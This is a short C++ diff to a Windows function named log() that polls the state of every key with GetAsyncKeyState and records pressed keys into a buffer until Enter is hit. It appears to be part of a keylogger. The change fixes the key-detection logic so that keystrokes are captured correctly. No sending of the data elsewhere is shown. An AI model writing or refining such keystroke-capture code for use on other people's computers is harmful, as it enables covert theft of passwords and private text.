@@ -20,11 +20,11 @@ void log() {
     bool pressed_keys[256];
     while (!progFini){
         for (int i = 0; i < 256; i++) {pressed_keys[i] = false;}
-        if(GetAsyncKeyState(13))while(GetAsyncKeyState(13))Sleep(10);
+        while(GetAsyncKeyState(13))Sleep(10);
         while (!pressed_keys[13] && buffer.size() < 1024 && !progFini) {
             for (int key = 0; key < 256; key++) {
                 // Correction : Affichage de l'état de la touche courante
-                if (GetAsyncKeyState(key)) {
+                if (GetAsyncKeyState(key) & 0x8000) {
                     pressed_keys[key] = true;
                     continue;
                 }
